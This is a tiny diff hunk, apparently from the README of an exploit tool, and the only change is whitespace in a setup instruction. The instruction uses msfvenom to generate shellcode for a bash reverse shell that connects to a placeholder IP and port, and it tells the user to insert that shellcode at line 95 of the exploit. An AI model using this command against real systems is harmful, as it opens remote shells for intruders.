@@ -10,7 +10,7 @@
 
 》 To create your shell code:
 
-  $msfvenom -p linux/x64/exec -f num CMD='bash -c "bash -i >& /dev/tcp/ip/port 0>&1"'
+  $ msfvenom -p linux/x64/exec -f num CMD='bash -c "bash -i >& /dev/tcp/ip/port 0>&1"'
    
 》 Make sure you changed the shell code on line 95 😉
 
